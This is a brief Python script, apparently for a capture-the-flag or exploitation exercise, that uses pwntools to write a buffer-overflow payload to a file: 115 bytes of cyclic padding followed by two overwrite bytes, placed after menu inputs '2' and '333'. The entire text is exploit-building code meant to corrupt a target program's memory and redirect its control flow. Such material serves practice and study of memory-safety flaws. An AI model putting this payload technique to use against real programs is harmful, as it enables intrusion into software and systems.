from pwn import *
g = cyclic_gen()
prefix = g.get(115)
payload = prefix + b'\x22\x0a'

with open('in.txt', 'wb') as f:
    f.write(b'2\n333\n')
    f.write(payload)
